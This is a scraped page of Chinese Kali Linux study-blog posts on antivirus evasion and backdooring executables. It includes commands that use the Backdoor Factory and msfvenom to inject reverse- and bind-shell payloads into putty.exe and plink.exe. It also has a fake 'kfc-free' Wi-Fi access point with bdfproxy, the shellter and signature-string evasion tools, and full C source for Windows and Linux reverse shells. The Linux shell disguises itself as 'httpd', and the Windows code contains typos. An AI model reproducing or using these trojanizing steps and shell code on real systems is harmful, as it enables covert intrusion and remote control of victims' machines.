<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80/443 -j REDIRECT --to-port 8080</code></strong></li>
<li><strong><code>🔺命令：./mana.sh</code></strong>（可能需要多次重启）</li>
</ul>
</li>
<li><strong><code>🔺命令：vi /etc/bdfproxy/bdfproxy.cfg</code></strong> <ul>
<li>proxyMode = transparent</li>
<li>HOST = Kali的IP（所有的HOST需要修改）</li>
</ul>
</li>
<li><strong><code>🔺命令：bdfproxy</code></strong>（生成一个rc文件）</li>
<li><strong><code>🔺命令：msfdb init</code></strong></li>
<li><strong><code>🔺命令：msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</code></strong><ul>
<li><strong><code>🔺命令：jobs</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>安装无线连接驱动（需插入无线网卡），连接wifi（kfc-free）</li>
<li>上网尝试</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1386ldfYFKX89GHYbJgsh34v1abCDXFs2nnTCpjfES3apTdZwpB7LzjPN84NiQWfUijXC1U7QrA_p2Uk40T8U4pgG-uzbWwn2GEWRaDbj-RKy1l9npfl9Q&file_name=/Fake%20AP.PNG" alt="Fack AP"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory/" itemprop="url">Kali Linux笔记(九十三)：Backdoor-factory</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T12:47:03+08:00">
                2020-02-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  699 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Backdoor-factory"><a href="#1-Backdoor-factory" class="headerlink" title="1. Backdoor-factory"></a>1. Backdoor-factory</h4><ul>
<li>▲ 2020.2.15 Backdoor-factory已不再受支持</li>
<li>▲ 2020.2.15 本机自带的backdoor-factory存在坑，需要从github上下载进行运行</li>
<li>▲ 2020.2.15 Backdoor-factory链接<a href="https://github.com/secretsquirrel/the-backdoor-factory.git" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory.git</a></li>
<li>Patch<ul>
<li>通过替换EXE、DLL、注册表等方法修复系统漏洞或问题的方法</li>
<li>BDF：向二进制文件中增加或者删除代码内容<ul>
<li>某些受保护的二进制程序无法patch</li>
<li>存在一定概率文件会被patch坏掉</li>
</ul>
</li>
</ul>
</li>
<li>后门工厂<ul>
<li>适用于windows PE x32/x64和Linux ELF x32/x64（OSX）</li>
<li>支持msf payload、自定义payload</li>
</ul>
</li>
<li>将shellcode代码patch进模板文件，躲避AV检查</li>
<li>Python语言编写</li>
<li>msf使用的patch方法<ul>
<li>覆盖程序入口<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp ……</code></strong></li>
</ul>
</li>
<li>创建新的线程执行shellcode并跳回源程序入口<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/reverse_tcp –k</code></strong></li>
<li>增加代码片段跳转执行后跳回源程序入口</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0d39gOGFNMUbsTxtVe3rgh1C0BAmNt5198rl3YAiSu_BaPMv4s9OO4sRcYzxZHaBW9yo96wj79fp9YvZErRU8FJKhBOmA9IGU0dv2mb0vDzKstUakhYfpX9ei0Znp73z_aE5BT0&file_name=/msf%E4%BD%BF%E7%94%A8patch%E6%96%B9%E6%B3%95.PNG" alt="msf使用的patch方法"></p>
<ul>
<li>CTP方法<ul>
<li>增加新的代码段section，与msf -k方法类似</li>
<li>使用现有的代码裂缝/洞（code cave）存放shellcode<ul>
<li>二进制文件中超过两个字节的连续x00区域（代码片段间区域）</li>
<li>根据统计判断代码洞是编译器在进行编译时造成的，不同的编译器造成的代码洞的大小不同</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：cp which cat</code></strong></li>
<li><strong><code>🔺命令：hexeditor cat</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=9d63erCVrgW_6sHoSiGjgV6lxrog7JamOb40CgvEegA0LvJ8wX2iMw5jj0z9gfhXnwpC1dqtr8QbvzDgJCMOadeLSdNmKuTnXuikGnhCnGNnqC4uEhRQ8BbCQLF8uM3o&file_name=/%E4%BB%A3%E7%A0%81%E6%B4%9E%E7%A4%BA%E4%BE%8B.PNG" alt="代码洞示例"></p>
<ul>
<li>单个代码洞大小不足以存放完整的shellcode<ul>
<li>多代码洞跳转（非顺序执行）<ul>
<li>初期免杀率可达100%</li>
</ul>
</li>
<li>结合msf的stager方法</li>
</ul>
</li>
<li>Path选项<ul>
<li>附加代码段</li>
<li>单代码洞注入</li>
<li>多代码洞注入</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=214dSOwXB0p4uUPdKomYlBMvh8lYxDishvPdWcr4XM6Wdf2mBk294qPOTdk6pCUWfprJoj1OrALXxwzrYCylsFtWD8Wgufb_FAE8ku7R3F5JGxy0ktT52OQYUHwrbRAa&file_name=/%E4%BB%A3%E7%A0%81%E6%B4%9E%E8%B7%B3%E8%BD%AC.PNG" alt="代码洞跳转"></p>
<h4 id="2-BDF的使用"><a href="#2-BDF的使用" class="headerlink" title="2. BDF的使用"></a>2. BDF的使用</h4><ul>
<li>参数<ul>
<li>-S（检测文件是否支持注入）</li>
<li>-l（可限定字节数的代码洞）</li>
<li>-H（指定IP地址）</li>
<li>-J（指定端口）</li>
</ul>
</li>
<li>检查二进制文件是否支持代码注入（可使用putty）<ul>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe –S</code></strong></li>
</ul>
</li>
<li>查看cave大小<ul>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -c</code></strong> </li>
</ul>
</li>
<li>显示可用payload<ul>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s show</code></strong></li>
<li>iat_reverse_tcp_stager_threaded（分步骤反弹shell的tcp连接）</li>
</ul>
</li>
<li>免杀效果对比（注入文件大小会发生改变）<ul>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666</code></strong>（单一代码洞注入）</li>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J</code></strong>（多代码洞注入）</li>
<li><strong><code>🔺命令：backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666</code></strong>（附加注入）</li>
</ul>
</li>
<li>验证有效性<ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit -j</code></strong></li>
</ul>
</li>
<li>物理主机<ul>
<li>双击putty.exe看是否能正常执行</li>
<li>查看shell的免杀效果（查杀网站）</li>
</ul>
</li>
<li>Kali<ul>
<li>看是否能连接上shell</li>
<li><strong><code>🔺命令：shell</code></strong></li>
<li><strong><code>🔺命令：ipconfig</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>与veil-evasion集成</li>
<li>IAT——import address table<ul>
<li>指针指向WinAPI地址，被称为thunks（形实转换程序），地址预定义</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=721fjA15I5_vSh9NhqlJEgIIcc3JFWfr9mp3qVH-3FxfrutwVQInLzoDKv4Hbk_r-A_fVU2nJrDWQkzj_N9gXu0AhOquqOqyBNbMc7Ed76AYk3rvB6rv&file_name=/bdf_p1.PNG" alt="bdf_p1"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=0368Ps19J_NYSG6_Werj9nSpGkPbtOrLqUdRA3fUw7m31QBXAQF64288xNjpZ7AnWJPJ5NPOQkJhrFyWqL-3zOPeBULnjH_Q9-rtmWC10f8IZS9jS-fL&file_name=/bdf_p2.PNG" alt="bdf_p2"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ecc4Fi7SOURxMyzSIKsh7WGeiW64iZOefj5VxcLHZmbRzruZAno3BBGayQo5KvBTiZIiPDo42bTLyE0iwi7ngU349fOalRyOK3Y7gIDZHfHzwpiGhvJB&file_name=/bdf_p3.PNG" alt="bdf_p3"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E6%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%8C)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E7%B2%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E6%9F%A5%E6%9D%80%E5%AD%97%E7%AC%A6%E4%B8%B2/" itemprop="url">Kali Linux笔记(九十二)：免杀技术--精确定位查杀字符串</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T21:05:58+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  255 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-精确定位查杀字符串"><a href="#1-精确定位查杀字符串" class="headerlink" title="1. 精确定位查杀字符串"></a>1. 精确定位查杀字符串</h4><ul>
<li>传统防病毒查杀原理<ul>
<li>查找文件体中特殊字符串，匹配则查杀</li>
</ul>
</li>
<li>找到触发AV查杀的精确字符串，并将其修改<ul>
<li>找到执行程序分片成很多小片段</li>
<li>将包含MZ头的第一个片段与后续片段一次组合后交给AV查杀</li>
<li>重复以上步骤，最终精确定位</li>
<li>Evade（window程序）、hexeditor（十六进制编辑器）、ghex（图形化界面）<ul>
<li><strong><code>🔺命令：wine evade.exe</code></strong></li>
<li><strong><code>🔺命令：open a file → Select Output</code></strong></li>
<li><strong><code>🔺命令：hexeditor TestFile_10000.exe</code></strong></li>
</ul>
</li>
<li>▲ 2020.2.13无找到evade此工具</li>
</ul>
</li>
</ul>
<h4 id="2-shellter"><a href="#2-shellter" class="headerlink" title="2. shellter"></a>2. shellter</h4><ul>
<li>代码混淆</li>
<li>定制的编码方式</li>
<li>多态编码</li>
<li>集成部分msf payload</li>
<li>目前只支持32位PE程序</li>
<li>使用正常的exe文件作为模板，将payload代码加入模板内<ul>
<li>模板程序的功能将失效</li>
</ul>
</li>
<li>▲ 2020.2.13需分片工具分好的PE Target</li>
</ul>
<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
<li>shellter<ul>
<li>Auto<ul>
<li>PE Target</li>
<li>L（列表）/C（定制）/H（帮助）</li>
</ul>
</li>
<li>Manaual</li>
<li>Help</li>
</ul>
</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell/" itemprop="url">Kali Linux笔记(九十一)：免杀技术--自编写shell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T20:50:01+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  318 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-自己编写后门"><a href="#1-自己编写后门" class="headerlink" title="1. 自己编写后门"></a>1. 自己编写后门</h4><ul>
<li>▲ 2020.2.13window的shell都无法通过编译</li>
<li>Windows reverse shell<ul>
<li><strong><code>🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib,&quot;ws2_32&quot;)</span><br><span class="line"></span><br><span class="line">  WSADATA wsaData;</span><br><span class="line">  SOCKET Winsock;</span><br><span class="line">  SOCKET Sock;</span><br><span class="line">  struct sockaddr_in hax;</span><br><span class="line">  char ip_addr[16];</span><br><span class="line">  STARTUPINFO ini_processo;</span><br><span class="line">  PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    WSAStartup(MAKEWORD(2,2),&amp;wsaData);</span><br><span class="line">    Winsock=WSASocket(AF_INET,SOCK_STREM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);</span><br><span class="line"></span><br><span class="line">    if(argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;Uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    struct hostent *host;</span><br><span class="line">    host = gethostbyname(argv[1]);</span><br><span class="line">    strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">    hax.sin_family = AF_INET;</span><br><span class="line">    hax.sin_port = htons(atoi(argv[2]));</span><br><span class="line">    hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">    WSAConnect(Winsock,(SOCKADDR*)&amp;hax,sizeof(hax),NULL,NULL,NULL,NULL);</span><br><span class="line"></span><br><span class="line">    memset(&amp;ini_processo,0,sizeof(ini_preocesso));</span><br><span class="line">    ini_processo.cb=sizeof(ini_processo);</span><br><span class="line">    ini_processo.dwFlags=STARTF_USESTDHANDLES;</span><br><span class="line">    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)winsock;</span><br><span class="line">    CreateProcess(NULL,&quot;cmd.exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;processo_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Linux shell<ul>
<li><strong><code>🔺命令：gcc -o linux.sh linux_revers_shell.c</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    struct sockaddr_in sock;</span><br><span class="line">    int s;</span><br><span class="line">    if(argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    sock.sin_family = AF_INET;</span><br><span class="line">    sock.sin_port = htons(atoi(argv[2]));</span><br><span class="line">    sock.sin_addr.s_addr = inet_addr(argv[1]);</span><br><span class="line">    s=socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line"></span><br><span class="line">    connect(s,(struct sockaddr_in *)&amp;sock,sizeof(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">    dup2(s,0);</span><br><span class="line">    dup2(s,1);</span><br><span class="line">    dup2(s,2);</span><br><span class="line">    execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0);  //process httpd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&file_name=/linux.sh.PNG" alt="linux.sh"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/" itemprop="url">Kali Linux笔记(九十)：免杀技术--模板程序附着</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T20:10:01+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  123 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-msfvenom–隐藏shell"><a href="#1-msfvenom–隐藏shell" class="headerlink" title="1. msfvenom–隐藏shell"></a>1. msfvenom–隐藏shell</h4><ul>
<li>▲ 附着在正常的程序模板上</li>
<li>msfvenom参数<ul>
<li>-x（指定模板）</li>
</ul>
</li>
<li>生成隐藏shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o msfvenom_plink_a.exe</code></strong></li>
</ul>
</li>
<li>编码隐藏shell<ul>
<li><strong><code>🔺命令：msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; msfvenom_plink_b.exe</code></strong></li>
</ul>
</li>
<li>比较编码前后的检测率</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=913dDsqoWqfgmCFaxKULa3Rs26q5N6faEj-afSVWXxmPFEyWfi0FyK0A_thO4SqsOfvw87Ge1Hny12CKH58veLiiG6xtX0el8dfZAsbAjsjpkjqvWWXxKG2Wz_sb64nD_Q&file_name=/msfvenom_plink_a.PNG" alt="msfvenom_plink_a.exe"></p>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7f190bA3M9ax_a8Q1iqGnAIpJSaoB7yLOES6ROWFjeyme_9ZqSszd37r_FPxawbOPK__maiCzUOBaOmPv2WB6NsnUWrDxn8z1nMSpSNY2mSMDrD8Xx3tAlUQRVTdu3pBbQ&file_name=/msfvenom_plink_b.PNG" alt="msfvenom_plink_b.exe"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--crypter%E5%8A%A0%E5%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
